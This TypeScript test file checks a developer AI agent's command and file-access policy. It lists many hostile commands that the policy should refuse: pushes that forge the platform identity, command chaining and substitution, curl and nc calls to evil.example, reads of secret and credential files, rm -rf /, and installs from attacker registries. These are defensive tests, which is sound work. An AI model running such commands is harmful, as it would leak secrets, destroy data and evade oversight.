import { describe, expect, it } from 'vitest';
import { checkCommand } from './commands.ts';
import { fileAccessFor, normalizeRepoPath } from './files.ts';

/**
 * Attacks on the shell and file policy of the developer agent (E13.2). Both engines apply
 * these functions before anything runs, so they are the last line before the sandbox.
 */

const refused = (command: string, options?: Parameters<typeof checkCommand>[1]) =>
  checkCommand(command, options).allowed === false;

describe('git pushes of the developer agent', () => {
  it.each([
    'git push',
    'git push origin HEAD:main',
    'git push origin HEAD:refs/heads/staging',
    'git push --force origin main',
    'git push origin :main',
    'git push origin refs/tags/release-99',
    'git push --mirror',
    'git send-pack /data/git/site.git main',
    'git remote add evil https://evil.example/site.git',
    'git remote set-url origin /data/git/site.git',
    'git config core.hooksPath /tmp/hooks',
    'git config --global user.name x',
    'git update-ref refs/heads/main HEAD',
    'git checkout main',
    'git switch staging',
    'git reset --hard origin/main',
    'git commit -am "direct"',
    'git fetch origin',
    'git clone /data/git/site.git /tmp/x',
    'git receive-pack /data/git/site.git',
    'git filter-branch --all',
  ])('refuses %s', (command) => {
    expect(refused(command)).toBe(true);
  });

  it('cannot forge the identity of the platform to pass the pre-receive hook', () => {
    // The hook trusts CMS_GIT_ACTOR, which only the worker sets: none of the ways to put a
    // variable in front of a command survives the parser, which accepts plain words only.
    for (const command of [
      'CMS_GIT_ACTOR=release git push origin HEAD:main',
      'CMS_GIT_ACTOR=changeset git status',
      'env CMS_GIT_ACTOR=release git push',
      'export CMS_GIT_ACTOR=release',
      'sh -c "CMS_GIT_ACTOR=release git push"',
      'bash -c "git push"',
      'git -c core.hooksPath=/dev/null push',
      'git -C /data/git/site.git push',
      'git --git-dir=/data/git/site.git push',
      'git --exec-path=/tmp status',
      'pnpm exec git push',
      'pnpm dlx git push',
      'pnpm --dir /data/git test',
      'pnpm test && git push',
      'pnpm test; git push',
      'pnpm test | git push',
      'git status $(git push)',
      'git status `git push`',
    ]) {
      expect(refused(command), command).toBe(true);
    }
  });

  it('lets only the read-only git commands through, inside the workspace', () => {
    expect(checkCommand('git status').allowed).toBe(true);
    expect(checkCommand('git diff').allowed).toBe(true);
    // Options that read or write outside the clone, or run an external program.
    for (const command of [
      'git diff --ext-diff',
      'git diff --textconv',
      'git diff --output=/tmp/out',
      'git diff /etc/passwd',
      'git diff ../other',
      'git status -C/tmp',
      'git diff --output /data/git/site.git/HEAD',
    ]) {
      expect(refused(command), command).toBe(true);
    }
  });
});

describe('commands that would reach secrets or the network', () => {
  it.each([
    'curl https://evil.example/upload',
    'wget http://169.254.169.254/latest/meta-data',
    'nc evil.example 4444',
    'ssh root@host',
    'env',
    'printenv',
    'cat /run/secrets/session_secret',
    'cat /cli-auth/0/claude/.credentials.json',
    'ls /cli-auth',
    'node -e "process.exit(0)"',
    'node script.js',
    'npx some-package',
    'pnpm exec node -e 1',
    'pnpm dlx some-package',
    'pnpm run dev',
    'pnpm publish',
    'pnpm login',
    'pnpm config set registry https://evil.example',
    'pnpm test --config.registry=https://evil.example',
    'rm -rf /',
    'chmod 777 .',
    'python3 -c "import os"',
    'docker ps',
    'psql -h postgres-prod',
  ])('refuses %s', (command) => {
    expect(refused(command), command).toBe(true);
  });

  it('accepts a new dependency only after the user approved that exact package', () => {
    const add = 'pnpm add --ignore-scripts left-pad@1.3.0';
    expect(refused(add)).toBe(true);
    expect(refused(add, { approvedDependencies: [] })).toBe(true);
    expect(refused(add, { approvedDependencies: ['lodash'] })).toBe(true);
    expect(checkCommand(add, { approvedDependencies: ['left-pad'] }).allowed).toBe(true);

    const approved = { approvedDependencies: ['left-pad'] };
    for (const command of [
      // Install scripts run with the network open.
      'pnpm add left-pad@1.3.0',
      // Code the user never saw: a URL, a git reference, a local path, a tarball.
      'pnpm add --ignore-scripts https://evil.example/left-pad.tgz',
      'pnpm add --ignore-scripts github:evil/left-pad',
      'pnpm add --ignore-scripts git+https://evil.example/left-pad.git',
      'pnpm add --ignore-scripts ../left-pad',
      'pnpm add --ignore-scripts /tmp/left-pad',
      'pnpm add --ignore-scripts npm:evil@1.0.0',
      'pnpm add --ignore-scripts left-pad@latest evil-package',
      // Another registry or a global install.
      'pnpm add --ignore-scripts --registry=https://evil.example left-pad',
      'pnpm add --ignore-scripts -g left-pad',
      'pnpm add --ignore-scripts --dir /tmp left-pad',
    ]) {
      expect(refused(command, approved), command).toBe(true);
    }
  });
});

describe('files of the developer agent', () => {
  it.each([
    '/etc/passwd',
    '/run/secrets/session_secret',
    '/cli-auth/0/claude',
    '../other-changeset',
    'app/../../other-changeset',
    '.git/config',
    '.git/hooks/pre-commit',
    '.claude/settings.json',
    'a\\..\\b',
    'a\0b',
  ])('rejects the path %s', (input) => {
    expect(normalizeRepoPath(input).ok).toBe(false);
  });

  it('accepts ordinary paths inside the clone', () => {
    expect(normalizeRepoPath('app/page.tsx')).toEqual({ ok: true, path: 'app/page.tsx' });
    expect(normalizeRepoPath('./app//page.tsx')).toEqual({ ok: true, path: 'app/page.tsx' });
  });

  it('does not treat any tool outside its two engines as a file or command tool', () => {
    for (const tool of ['WebFetch', 'WebSearch', 'Task', 'NotebookEdit', 'mcp__evil__read']) {
      expect(fileAccessFor(tool), tool).toBeUndefined();
    }
    expect(fileAccessFor('constructor')).toBeUndefined();
    expect(fileAccessFor('__proto__')).toBeUndefined();
  });
});
